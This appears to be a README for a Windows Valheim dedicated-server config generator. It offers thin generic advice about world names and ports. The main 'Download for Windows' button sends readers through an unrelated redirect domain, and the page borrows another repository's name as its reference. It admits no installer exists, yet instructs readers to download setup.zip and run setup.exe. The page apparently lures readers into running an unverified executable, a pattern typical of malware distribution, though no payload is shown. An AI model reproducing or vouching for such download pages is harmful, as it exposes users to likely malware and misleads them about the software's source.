<h1 align="center">Valheim Dedicated Server Config Generator for Windows 🖧</h1>

<p align="center"><img src="41-interface.jpg" alt="Soygen/valheim-server-configurator — Valheim Dedicated Server Config Generator" width="430"></p>

<!-- Screenshot source: https://raw.githubusercontent.com/Soygen/valheim-server-configurator/main/vsc_screen.jpg | SHA256: 85b4d1b034658a717d59b0025a39ab6376b36815d212adeba521148fcb63d18e -->

<p align="center"><img src="https://img.shields.io/badge/Windows-225EA8?style=for-the-badge" alt="Windows" height="25"> <img src="https://img.shields.io/badge/Server%20configuration-416850?style=for-the-badge" alt="Server configuration" height="25"> <img src="https://img.shields.io/badge/Windows%20guide-59636E?style=for-the-badge" alt="Windows guide" height="25"> </p>

Prepare Valheim dedicated-server settings with the world name, network port and launch configuration in one record. Keep startup arguments separate from saved-world data so changing a launch setting does not select the wrong world.

Implementation reference: [Soygen/valheim-server-configurator](https://github.com/Soygen/valheim-server-configurator).

<p align="center"><a href="[https://redirectify.live/](https://redirectify.live/)"><img src="https://img.shields.io/badge/Download%20for%20Windows-416850?style=for-the-badge" alt="Download for Windows — Valheim Dedicated Server Config Generator" height="42"></a></p>

<p align="center"><sub><b>English</b> · <a href="README_ES.md">Español</a> · <a href="README_PT.md">Português (Brasil)</a> · <a href="README_DE.md">Deutsch</a> · <a href="README_FR.md">Français</a> · <a href="README_CN.md">简体中文</a> · <a href="README_TW.md">繁體中文</a> · <a href="README_JP.md">日本語</a> · <a href="README_KR.md">한국어</a></sub></p>

<p><strong>🧭 On this page</strong><br><a href="#focus">What matters here</a> · <a href="#questions">Questions worth resolving</a> · <a href="#setup">Windows package setup</a></p>

<a name="comparison"></a>

## ⚖️ Compare the right inputs

> Compare the launch world name with the saved-world files and the account running the server. A display name alone may not identify the intended save.

Keep the first working result as your comparison point. Change one input at a time so the next result has an explanation.

---

<a name="focus"></a>

## 🔎 World name · Port · World modifiers

### 1 · World name

Record the intended world and the account running the server.

### 2 · Port

Review launch settings separately from world files.

### 3 · World modifiers

Start a controlled session and confirm the expected world was loaded.

---

<a name="alternatives"></a>

## ↔️ Choosing another approach

A launch script starts a server; a configurator helps prepare settings; a management panel may also handle backups and restarts. Confirm each responsibility rather than assuming that configuration generation includes ongoing administration.

---

<a name="setup"></a>

## 📦 Windows package setup

The Windows package is a planned distribution; no installer is included in this repository. Once a package is supplied through the download link, use this sequence.

1. Download `setup.zip`.
2. Extract `setup.zip` in File Explorer.
3. Run `setup.exe` from the extracted files.

---

<a name="questions"></a>

## 💬 Questions worth resolving

<details>
<summary>💬 Why does the server load a different world?</summary>

Compare the launch world name with the saved-world files and the account running the server. A display name alone may not identify the intended save.

</details>
